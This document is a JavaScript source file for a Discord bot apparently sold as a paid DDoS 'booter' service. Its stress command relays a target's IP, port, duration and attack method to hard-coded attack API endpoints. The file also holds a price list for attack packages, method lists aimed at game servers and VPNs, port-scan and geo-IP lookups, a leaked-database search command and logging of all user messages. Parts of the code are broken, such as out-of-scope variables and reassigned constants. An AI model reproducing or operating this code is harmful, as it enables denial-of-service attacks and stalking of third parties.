const Discord = require("discord.js");
const fetch = require("node-fetch");
const fs = require("fs");
const discordBot = new Discord.Client();
process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0
const setTitle = require('node-bash-title');
const { userInfo } = require("os");
const { exec } = require('child_process');
const config = require("./config.json");

/*██████████████████████████████████████████████

█ Created By Clipzy#0140                       █
████████████████████████████████████████████████
█ To use this you need the following:          █
█ discord.js | npm install discord.js --save   █
█ note-fetch | npm install node-fetch --save   █
██████████████████████████████████████████████*/

setTitle("[Clipzy V1.00]");

const RED = "\x1b[91m";
const YELLOW = "\x1b[93m";
const CYAN = "\x1b[96m";
const PURPLE = "\x1b[95m";
const RESET = "\x1b[39m";

//YOUR TOKEN HERE

const accountToken = config.Token;

//BOT TURNING ON

discordBot.on("ready", () => {
    console.clear();
    console.log(CYAN + "            ████████████████████████████████►" + PURPLE + "Clipzy Discord Bot" + CYAN + "◄███████████████████████████████████");
    console.log("            ██                                                                                   ██");
    console.log("            ██              Clipzy Bot Now Started! █ Created & Developed By: Clipzy             ██");
    console.log("            ██                                                                                   ██");
    console.log("            ██                          Type ./info in server to start!                          ██");
    console.log("            ██                                                                                   ██");
    console.log("            ███████████████████████████████████████████████████████████████████████████████████████");
    console.log("            ██                     USER INFO █ SERVER INFO █ PERMISSION CHECK                    ██");
    console.log("            ███████████████████████████████████████████████████████████████████████████████████████");
    console.log("            ██ " + YELLOW + "REGULAR MESSAGES" + CYAN + "                                                 " + RED + "COMMAND MESSAGES" + CYAN + " ██");
    console.log("            ██                                 Logging Formart                                   ██");
    console.log("            ██  USER █ USERID                                                                    ██");
    console.log("            ██  SERVER █ SERVER_ID                                                               ██");
    console.log("            ██  ADMIN █ MANAGE MSG █ MANAGE ROLE                                                 ██");
    console.log("            ██  CMD/MSG                                                                          ██");
    console.log("            ███████████████████████████████████████████████████████████████████████████████████████");
    discordBot.user.setPresence({ status: 'dnd', game: { name: bot_prefix + 'info to get started!!' } });
});

/************
 * BOT INFO *
************/
const bot_prefix = "./";
const bot_title = "b00t3rn3t";
const bot_version = "v1.00";
const bot_inv = "https://discord.com/api/oauth2/authorize?client_id=775893565163307059&permissions=8&scope=bot";
const bot_server = "https://discord.gg/cknCDYxHdG";

/***************
 * MY INFO     *
 **************/

 const myDISCORD = "Fronto#8406";
 const myDISCORD_ID = "775448210859622442";
 const mySERVER = "Developer Laboratory";
 const mySERVER_ID = "775763129119801356";
 const myctmInv = "https://clipzy.cf/discord";
 const myINVITE = "https://discord.gg/cknCDYxHdG";
/*---------------------------------String-------------------------------------*/
const GEOAPI = "https://clipzy.cf/jDa00EfYS1nr7/?action=geoip&q=";
const PORTSCANAPI = "https://clipzy.cf/jDa00EfYS1nr7/?action=portscan&q=";

//BOOT STRINGS
//var BOOTERAPI = "http://194.62.6.173/skid.php?host=";
const BOOTERAPI2 = "";
const BOOTERAPI3 = "http://185.239.242.31/Qbot.php?&host=";
// var STOPAPI = "http://167.99.10.248/test.php?method=STOP&ip=";
// var STOPALLAPI = "http://167.99.10.248/test.php?method=STOPALL";
const PORTAPI = "&port=";
const TIMEAPI = "&time=";
const METHODAPI = "&method=";

const SEARCHED = "";

discordBot.on("message", function (message) {


    /*********************
       DISCORD STRINGS
    *********************/

   const USER_TAG = message.author.tag;
   const USER_NAME = message.author.username;
   const USER_ID = message.author.id;

   const DISCORD_SERVER = message.guild.name;
   const SERVER_ID = message.guild.id;

   const messagereceived = message.content;

   /**************************
    * END OF DISCORD STRINGS
    * ***************************/

    /***************************************************************************************************************************
     * *********************************************************************************************************************** *
     ***************************************************************************************************************************/

    /*************************
    * COMMAND HANDLER
    * ***********************/  
    if(message.author.bot) return;
    if (messagereceived.startsWith(bot_prefix)) {
        // if (USER_ID === myDISCORD_ID) { //WHITELIST A USER TO USE THE BOT (DISABLED FROM EVERYONE ELSE)
            if (config.blacklist.include(DISCORD_SERVER)) // Maybe do you wanna use the server ID instead of name?
            { 
                logger("command");
                sendmsg("__**Error**__","This server (" + DISCORD_SERVER + ") has been blacklisted from being used! Try using the bot in another server or the main server!") ;
            } 
            else 
            {
                if(user_registered(USER_ID) == true) 
                {
                    const user_info = get_user_data(USER_ID);
                    if(user_info.includes("blacklistedusr") == true) {
                        sendmsg("__**Blacklisted**__", "You are blacklisted from using this BOT!");
                    }
                    else if(messagereceived.startsWith(bot_prefix + "register") == true)
                    {
                        logger("command");
                        sendmsg("Error", "You already a registered user, you cannot use this command!");
                    } else {
                        logger("command");
                        const commands = "info help admincp geo pscan dblookup resolve urlresolve stress methods buypremium myinvite invite prices main_server bot_inv myinfo"
                        const command = commands.split(' ');
                        main();
                    }
                }
                else if(messagereceived.startsWith(bot_prefix + "register") == true) 
                {
                    logger("command");
                    const lul = register(USER_TAG, USER_ID);
                    sendmsg("Register Status", lul);
                }
                else 
                {
                    logger("command");
                    sendmsg("__**Error**__", "You are not registered to use this bot. To register, type ``" + bot_prefix + "register``!")
                }
            }
        // } 
        // else 
        // {
        //     sendmsg("__**Error**__",bot_title + " is currently under maintenance. Join the main discord for updates! " + myctmInv);
        //     message.channel.send(myINVITE);
        // }
    } 
    else 
    { 
        logger("msg"); 
    }

    /***************************
    * END OF COMMAND HANDLER   *
    * *************************/

    /***************************************************************************************************************************
     * *********************************************************************************************************************** *
     ***************************************************************************************************************************/

    /*************************
    * FUNCTIONS              *
    * ***********************/

    function main() {

        /********************
         * FREE COMMANDS    *
         * *****************/
        
        if (messagereceived.startsWith(bot_prefix + command[0])) 
        { // INFO COMMAND
            info();
        }

        if (messagereceived.startsWith(bot_prefix + command[1])) 
        { // Help COMMAND
            help();
        }

        if (messagereceived.startsWith(bot_prefix + command[13])) 
        { //Price Command
            sendmsg("__**List Of Premium Packages**__","█► **Package Name** ◄█► **Package Length** ◄█► **Server Access** ◄█\n\n█► b00t3rn3t [1] ◄█► 1 Month ◄█► Limited Server ◄█► $5 ◄█\n█► b00t3rn3t [2] ◄█► 2 Months ◄█► Limited Server ◄█► $10 ◄█\n█► b00t3rn3t [3] ◄█► LifeTime ◄█► Limited Server ◄█► $30 ◄█\n█► b00t3rn3t [4] ◄█► 1 Month ◄█► All Servers ◄█► $20 ◄█\n█► b00t3rn3t [5] ◄█► 2 Months ◄█► All Servers ◄█► $30 ◄█\n█► b00t3rn3t [6] ◄█► 3 Months ◄█► All Servers ◄█► $40 ◄█\n█► b00t3rn3t [7] ◄█► LifeTime ◄█► All Servers ◄█► $65 ◄█")
        }

        if (messagereceived.startsWith(bot_prefix + command[9])) 
        { // method COMMAND
            sendmsg("__**List OF METHODS (API: 1)**__","█► Valve\n█► GRENADE\n█► UDPBypass\n█► XSYN\n█► ARD\n█► IPX\n█► FiveM\n█► SOAP\n█► CLDAP\n█► TCP-AMP\n█► DNS-Sec\n█► DNS");
        }

        if (messagereceived.startsWith(bot_prefix + command[10])) { // buypremium COMMAND
            sendmsg("__**PREMIUM**__"," Type " + bot_prefix + "N/A Pricing Soon!")
        }
 
        if (messagereceived.startsWith(bot_prefix + command[3])) { // GEO LOCATOR
            const urgn = messagereceived.split(' ');
            const action = urgn[1]; //METHOD REQUEST
            const ip = urgn[2];

            fetch(GEOAPI + ip)
            .then(res => res.text())
            .then(body => { 
                if(action == "all") {
                    sendmsg("__**Geo Locator Results For " + ip + "**__", "```" + body + "```");
                } else if(action == "isp") {
                    const split_geo = body.split('\n');
                    const isp = split_geo[9];
                    sendmsg("__**Geo Locator Results For " + ip + "**__", "```" + isp + "```");
                }})
        }

        if (messagereceived.startsWith(bot_prefix + command[4])) { //portscan COMMAND
            message.channel.send("Port scanning, Please wait.....");
            const urgn = messagereceived.split(' ');
            const ip = urgn[1]; 

            fetch(PORTSCANAPI + ip)
            .then(res => res.text())
            .then(body => sendmsg("__**Port Scanner Result For '" + ip + "'**__", "```" + body + "```"));
        }

        if (messagereceived.startsWith(bot_prefix + command[11])) { // myinvite CoMMAND
            sendmsg("__**Fronto's Persoonal Server**__", myINVITE);
        }

        if (messagereceived.startsWith(bot_prefix + command[12])) { // invite COMMAND
            const urgn = messagereceived.split(' ');
            const invv = urgn[1]; //METHOD REQUEST
            
            if (USER_ID === myDISCORD_ID) {
                sendmsg("__**Fronto Invited You To A Server**__",invv)
            } else { sendmsg("__**Error**__","You can't use this shit lmao")}
        }

        if (messagereceived.startsWith(bot_prefix + command[14])) { // main server inv
            sendmsg("__**Fronto Invited You To Fronto's Main Server**__", bot_server)
        }
        
        if (messagereceived.startsWith(bot_prefix + command[15])) { // main server inv
            sendmsg("__**BOT Inv**__", bot_inv)
        }

        if (messagereceived.startsWith(bot_prefix + command[16])) { // main server inv
            const getUSER_INFO = get_user_data(USER_ID);
            const split_data = getUSER_INFO.split("','");

            sendmsg("__**My Info**__", "```User: " + split_data[0].replace("('", "") + "\nUser ID: " + split_data[1] + "\nMembership: " + split_data[2] + "\nMax Time: " + split_data[3].replace("')", "") + "```");
        }

        if (messagereceived.startsWith(bot_prefix + "search")) {
            const urgn = messagereceived.split(' ');
            const getUSER_INFO = get_user_data(urgn[1]);
            const split_data = getUSER_INFO.split("','");

            sendmsg("__**User's> Info**__", "```User: " + split_data[0].replace("('", "") + "\nUser ID: " + split_data[1] + "\nMembership: " + split_data[2] + "\nMax Time: " + split_data[3].replace("')", "") + "```");
        }

        /********************
         * PREMIUM COMMANDS *
         * *****************/

        if(messagereceived.startsWith(bot_prefix + command[8])) { // smack COMMAND | BOOTER
            const urgn = messagereceived.split(' ');
            const method = urgn[1]; //METHOD REQUEST
            const bootip = urgn[2];
            const port = urgn[3];
            const time = urgn[4];
            
            

            if (user_premium(USER_ID) == true) 
            {
                if(time > get_TIME(USER_ID)) 
                {
                    if(method === "STOP") 
                    {
                        killattk(bootip);
                    } 
                    else if (method === "-h") { 
                        sendmsg("__**Error**__","A mistaken has occured. here an example on how to use this command\nex: +stress UDP 6.6.6.6 80 120 3")
                    } 
                    else 
                    {                        
                        fetch(BOOTERAPI2 + bootip + PORTAPI + port + TIMEAPI + time + METHODAPI + method)
                        .then(res => res.text())
                        .then(body => {
                            if(body == "Couldn't Connect To CNC Server...") { 
                                sendmsg("__**Attack Status**__", body)
                            } else {
                                sendmsg("__**Attack status**__" , "Attack sent to " + bootip + ":" + port + " for " + time + " seconds with " + method);
                            }
                            console.log("API 1: " + body + "\n\n"); 
                        })
                    }
                } 
                else 
                { 
                    sendmsg("__**Error**__", "You have no boot time to boot! Your plan time: " + get_TIME(USER_ID))
                }
            } 

            else 
            { 
                sendmsg("__**Error**__","You are not a premium member to use this!"); 
            }
        }

        /********************
         * ADMIN COMMAND    *
         * *****************/

        if (messagereceived.startsWith(bot_prefix + command[2])) { // admincp COMMAND
                const urgn = messagereceived.split(' ');
                const action = urgn[1];
                const clientid = urgn[2];
                if(isAdmin(USER_ID) == true) 
                {
                    if (action === "help") 
                    {
                        admincp();
                    } else if(action === "upgrade") {
                        const newrank = urgn[3];
                        const newtime = urgn[4];
                        if(newrank === "admin" || newrank === "reseller") {
                            if(USER_ID == myDISCORD_ID) {
                                if(newrank === "admin") { newrank = "adminusr"; }
                                if(newrank === "reseller") { newrank = "resellerusr"; }
                                sendmsg("User upgrade!", upgradeUSER(clientid, newrank, newtime));
                            } else {
                                sendmsg("__**Error**__", "You are not owner of this bot to premote any user to Admin/Reseller!");
                            }
                        } else {
                            if(newrank === "premium") { newrank = "premiumusr"; }
                            if(newrank === "free") { newrank = "freeusr"; }
                            sendmsg("User upgrade!", upgradeUSER(clientid, newrank, newtime));
                        }
                    }
                    else if(action == "block") {

                    }
                } else {
                    sendmsg("Error", "You aren't admin to use this command!");
                }
        }
    }

    /****************************
     * END OF COMMAND FUNCTIONS *
     * *************************/
    
    /***************************************************************************************************************************
     * *********************************************************************************************************************** *
     ***************************************************************************************************************************/

    /*************************
     * LOGGER                *
     * **********************/

    function logger(type) {
        const logdis = "";
        const isAdmin = "No";
        const isModMessages = "No";
        const isModRoles = "No";

        /* BOT USER ID STRINGS */
        const dyno = "155149108183695360"
        const betterantispam = "501982335076532224"
	
	
        if(message.channel.permissionsFor(message.member).has("ADMINISTRATOR"))
        {
            isAdmin = "Yes";
        } 
        if(message.channel.permissionsFor(message.member).has("MANAGE_MESSAGES"))
        {
            isModMessages = "Yes";
        } 
        if(message.channel.permissionsFor(message.member).has("MANAGE_ROLES"))
        {
            isModRoles = "Yes";
        } 

        if (USER_NAME === bot_title || USER_ID === dyno || USER_ID === betterantispam)
        {} 
        else 
        {
            logdis = "[USER]: " + USER_TAG + " | [USER_ID]: " + USER_ID + "\n[SERVER]: " + DISCORD_SERVER + " | [SERVER_ID]: " + SERVER_ID + "\n[ADMIN]: " + isAdmin + " | [MANAGE MSG]: " + isModMessages + " | [MANAGE ROLES]: " + isModRoles + "\n[MESSAGE/COMMAND]: " + messagereceived;
            fs.appendFileSync('db/logs.log', logdis + "\n\n");
            if (type === "command") 
            {
                console.log("\x1b[31m" + logdis + "\r\n\x1b[37m");
            } 
            else 
            { 
                console.log("\x1b[93m" + logdis + "\r\n\x1b[37m"); 
            }
        }       
    }

    /****************************
     * END OF LOGGER            *
     * *************************/
    
    /***************************************************************************************************************************
     * *********************************************************************************************************************** *
     ***************************************************************************************************************************/

    /*************************
    * EMBED DISCORD MESSAGE  *
    * ***********************/

    function sendmsg(titled, descriptiond) {
        message.channel.send({embed: {
            color: 16711680,
            title: bot_title + " | " + titled,
            description: descriptiond,
            footer: { text: bot_title + ` | Created & Developed By: ` + myDISCORD + ` | Main Server: ` + myctmInv}
            }});
    }
    

    function info() 
    {
        const exampleEmbed = new Discord.MessageEmbed()
	    .setColor('#ff0000')
	    .setTitle(bot_title + " | Info + Stats")
	    .setDescription('█► Welcome To Clipzy (BOT) | Version 1.00')
	    .addFields(
        { name: 'Type ./help for a list of commands!', value: '█► BOT Stats' },
		{ name: '\u200B', value: '\u200B' },
		{ name: 'Total Users: ', value: lineCOUNT("db/users.sql") },
		{ name: 'Total Premium Users: ', value: 'Coming soon....' },
		{ name: 'Total Boot Servers', value: '1' },)
	    .setFooter(bot_title + ` | Creator: ` + myDISCORD + ` | Main Server: https://depatched.ga/join`, '');

        message.channel.send(exampleEmbed);
    }

    function help() 
    {
        const exampleEmbed = new Discord.MessageEmbed()
	    .setColor('#ff0000')
	    .setTitle(bot_title + " | List of commands")
	    .setDescription('Format: \n - Command/Info\n - Command Usage')
	    .addFields(
		{ name: 'Info | BOT Info', value: bot_prefix + 'info' },
		//{ name: '\u200B', value: '\u200B' },
		{ name: 'Help | Command list', value: bot_prefix + 'help'},
		{ name: 'GeoIP | IP Location', value: bot_prefix + 'geo <emthod(all/isp)> <ip>'},
		{ name: 'Port Scan | Grab open ports on a IP', value: bot_prefix + 'pscan <ip>'},
		{ name: 'Domain Resolver | Grab URL IP', value: bot_prefix + 'urlresolve <ip>'},
		{ name: 'PSN Resolver | Grab IP(s) on a Username', value: bot_prefix + 'psnresolve <ip>'},
		{ name: 'Database Search | Grab old account data', value: bot_prefix + 'dbsearch <username/email/ip/password>'},
		{ name: 'Prices | Bot plans and link to buy now!', value: bot_prefix + 'prices'},
		{ name: 'Methods | List of methods for premium users', value: bot_prefix + 'methods'},
		{ name: 'Bot Invite | Invite this bot to your server', value: bot_prefix + 'bot_inv'},
		{ name: "Clipzy's Server | Clipzy's Main Server Invite", value: bot_prefix + 'main_invite'},
		{ name: "Clipzy's Server | Clipzy's Personal Server Invite", value: bot_prefix + 'myinvite'},
		{ name: '\u200B', value: '\u200B' },
		{ name: 'Admin | List of admin commands', value: bot_prefix + 'admincp'},)
	    .setFooter(bot_title + ` | Created & Developed By: ` + myDISCORD + ` | Main Server: https://depatched.ga/join`,'');

        message.channel.send(exampleEmbed);
    }

    function admincp()
    {
        const exampleEmbed = new Discord.MessageEmbed()
	    .setColor('#ff0000')
	    .setTitle(bot_title + " | List of commands")
	    .setDescription('Format: \n - Command/Info\n - Command Usage')
	    .addFields(
		{ name: "Update User | Upgrade a user's plan", value: bot_prefix + 'admincp upgrade <client_id> <free/premium/reseller/admin> <maxtime>' },
		{ name: 'Blacklist User | Block user from bot', value: bot_prefix + 'admincp block <client_id>'},
		{ name: '\u200B', value: '\u200B' },
		{ name: 'Owner Commands', value: 'Owner ONLY!'},
		{ name: '\u200B', value: '\u200B' },
		{ name: 'Demote Admin', value: bot_prefix + 'new_admin <client_id>'},
		// { name: 'PSN Resolver | Grab IP(s) on a Username', value: bot_prefix + 'psnresolve <ip>'},
        )
	    .setFooter(bot_title + ` | Created & Developed By: ` + myDISCORD + ` | Main Server: https://depatched.ga/join`,'');

        message.channel.send(exampleEmbed);
    }

    /*************************
    * END OF EMBED MESSAGES  *
    * ***********************/
})

    /***************************************************************************************************************************
     * *********************************************************************************************************************** *
     ***************************************************************************************************************************/
    
    /*************************
    * EXTRA FUNCTIONS        *
    * ***********************/
function sleep (time) 
{
    return new Promise((resolve) => setTimeout(resolve, time));
}

function get_user_data(search) 
{
    const result = "";
    let file = fs.readFileSync("db/users.sql", "utf8");
    let arr = file.split(/\r?\n/);
    arr.forEach((line, idx)=> {
        if(line.includes(search)){
        result = (line);
        }
    });
    return result;
}

function register(user, userid) 
{
    fs.appendFileSync('db/users.sql', "('" + user + "','" + userid + "','freeusr','0')\n");
    return "User registered! Thank you, <@" + userid + "> for registering!";
}

function upgradeUSER(uid, membership, time) 
{
    search_user = get_user_data(uid);

    if(search_user == null)
    {
        return "User is not registered yet! <@" + uid + "> has to register first!";
    } else {
        const split_info = search_user.split("','");
        const dbusrname = split_info[0].replace("('", "");
        fs.appendFileSync('db/users.sql', "('" + dbusrname + "','" + uid + "','" + membership + "','" + time + "')\n");
        return "User updated! <@" + uid + "> Enjoy!";
    }
}

function lineCOUNT(filename) 
{
    const data=fs.readFileSync(filename);
    const res=data.toString().split('\n').length;
    return res-1;
}

function user_registered(userid) 
{
    const search = get_user_data(userid);
    if(search === null || !search || search == "")
    {
        return false;
    } 
    else 
    {
        return true;
    }
}

function user_premium(userid) 
{
    const search = get_user_data(userid);
    if(search.includes("freeusr") == true)
    {
        return false;
    } 
    else 
    {
        return true;
    }
}

function isAdmin(userid) 
{
    const search = get_user_data(userid);
    if(search.includes("adminusr"))
    {
        return true;
    } 
    else if(search.includes("ownerusr") == true) 
    {
        return true;
    }
    else if(search.includes("resellerusr") == true)
    {
        return true;
    }
    else 
    {
        return false;
    }
}


function adminCOUNT() 
{
     // unnecessary function?
}

function get_TIME(key)
{
    const user_info = get_user_data(key).split("','");
    const fix = user_info[3].replace("')", "");
    return fix;
}

function get_METHODS(method)
{
    const resultz = "";
    fetch("https://clipzy.cf/methods.txt").then(res => res.text()).then(body => { 
        if(body.includes(method) == true){
            return true;
        } else {
            return false;
        }
     })
}

function get_method_and_send_2_api(ip, p, t, m)
{
    const api_1_methods = [ "value", "GRENADE", "UDPBYPASS", "XSYN", "FiveM", "SOAP", "CLDAP", "TCP-AMP", "DNS-Sec", "DNS" ];
    const api_2_methods = [ "NTP", "ARD", "WSD", "LDAP", "K.O", "WEBSERVER-RAPE", "NFO-RX", "OVH-TCPv2", "NFO-X", "NFO-ATOM", "OVH-ATM", "ATOM-KILLALL", "ATOM-GAMEv1", "ATOM-FIVEM", "COD", "WSDv2", "VPN-KILL", "BLACKOUT", "IPSEC", "OPENVPN", "DVR", "FORTNITE", "FN-LAG", "R6-RANKED", "FIVEM" ];

    if(api_1_methods.includes(m) == true ) 
    {
        
        fetch(BOOTERAPI2 + ip + PORTAPI + p + TIMEAPI + t + METHODAPI + m)
        .then(res => res.text())
        .then(body => { console.log(body); })
        return "Attack sent to " + ip + ":" + p + " for " + t + " seconds with " + m;
    } 
    else if(api_2_methods.includes(m) == true)
    {
        fetch(BOOTERAPI3 + ip + PORTAPI + p + TIMEAPI + t + METHODAPI + m)
        .then(res => res.text())
        .then(body => { console.log(body); })
        return "Attack sent to " + ip + ":" + p + " for " + t + " seconds with " + m;
    } 
    else 
    {
        return "Invalid method!";
    }
}

function get_current_time(){
   // unnecessary function?
}

function log_attacks(usr, ip, p, t, m, timestamp){
    fs.appendFileSync("db/attackhistory.sql", "('" + usr + "','" + ip + "','" + p + "','" + t + "','" + m + "','" + timestamp + "')");
}

function post_api_attack(ip, port, time, method) {
    // unnecessary function?
}


discordBot.login(accountToken);
